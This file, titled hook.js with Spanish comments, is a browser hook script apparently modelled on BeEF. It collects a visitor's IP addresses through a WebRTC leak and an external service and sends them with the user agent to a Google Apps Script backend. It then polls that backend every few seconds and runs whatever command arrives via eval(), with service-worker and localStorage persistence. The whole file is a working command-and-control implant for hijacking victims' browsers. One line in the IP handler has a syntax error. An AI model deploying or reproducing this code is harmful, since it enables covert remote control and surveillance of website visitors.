// hook.js
(function() {
  // Configuración - REEMPLAZA ESTOS VALORES
  var SCRIPT_URL = "https://script.google.com/macros/s/.../exec"; // Tu URL de Apps Script
  var SESSION_ID = generateSessionId();
  var CHECK_INTERVAL = 3000; // 3 segundos
  var PERSISTENCE_KEY = '_beef_hook';
  
  // Generar un ID de sesión único
  function generateSessionId() {
    return 'sess_' + Math.random().toString(36).substr(2, 9) + 
           '_' + Date.now().toString(36);
  }
  
  // Obtener IP aproximada (método alternativo)
  function getIPInfo() {
    return new Promise(function(resolve) {
      // Intentamos obtener IP via WebRTC (no estándar pero funciona en algunos navegadores)
      var ips = [];
      var RTCPeerConnection = window.RTCPeerConnection || 
                             window.mozRTCPeerConnection || 
                             window.webkitRTCPeerConnection;
      
      if (RTCPeerConnection) {
        try {
          var pc = new RTCPeerConnection({iceServers: []});
          pc.createDataChannel("");
          pc.createOffer().then(function(offer) {
            return pc.setLocalDescription(offer);
          });
          
          pc.onicecandidate = function(ice) {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
            if (ips.indexOf(ip) === -1) && ip !== '0.0.0.0') ips.push(ip);
          };
        } catch(e) {}
      }
      
      // Fallback: Usamos un servicio externo para IP pública
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          if (data.ip && ips.indexOf(data.ip) === -1) ips.push(data.ip);
          resolve({ips: ips, timestamp: new Date().toISOString()});
        })
        .catch(() => resolve({ips: ips, timestamp: new Date().toISOString()}));
    });
  }
  
  // Inicializar sesión en el backend
  async function initSession() {
    try {
      const ipInfo = await getIPInfo();
      const params = new URLSearchParams({
        action: 'init',
        sessionId: SESSION_ID,
        ua: navigator.userAgent,
        ip: JSON.stringify(ipInfo.ips),
        timestamp: ipInfo.timestamp
      });
      
      fetch(`${SCRIPT_URL}?${params.toString()}`)
        .catch(e => console.error('Init error:', e));
    } catch(e) {
      console.error('Session init failed:', e);
    }
  }
  
  // Consultar comandos pendientes
  function checkCommands() {
    fetch(`${SCRIPT_URL}?action=getcmd&sessionId=${SESSION_ID}`)
      .then(response => response.text())
      .then(cmd => {
        if (cmd && cmd !== 'noop') {
          executeCommand(cmd);
        }
      })
      .catch(e => console.error('Command check failed:', e));
  }
  
  // Ejecutar comando y enviar respuesta
  function executeCommand(cmd) {
    try {
      const result = {
        output: String(eval(cmd)),
        type: 'success',
        executedAt: new Date().toISOString()
      };
      sendResponse(cmd, result);
    } catch(e) {
      const result = {
        output: e.message,
        type: 'error',
        executedAt: new Date().toISOString()
      };
      sendResponse(cmd, result);
    }
  }
  
  // Enviar respuesta al backend
  function sendResponse(cmd, result) {
    const params = new URLSearchParams({
      action: 'response',
      sessionId: SESSION_ID,
      cmdId: btoa(unescape(encodeURIComponent(cmd))), // Codificar comando
      response: JSON.stringify(result)
    });
    
    fetch(`${SCRIPT_URL}?${params.toString()}`)
      .catch(e => console.error('Response failed:', e));
  }
  
  // Persistencia mejorada
  function setupPersistence() {
    // Intenta usar Service Worker si está disponible
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js')
        .then(reg => console.log('SW registered:', reg))
        .catch(e => console.error('SW registration failed:', e));
    }
    
    // Fallback a localStorage
    if (!localStorage.getItem(PERSISTENCE_KEY)) {
      localStorage.setItem(PERSISTENCE_KEY, 'active');
      initSession();
    }
    
    // Iniciar polling de comandos
    setInterval(checkCommands, CHECK_INTERVAL);
    checkCommands(); // Primera comprobación inmediata
  }
  
  // Iniciar todo
  setupPersistence();
})();
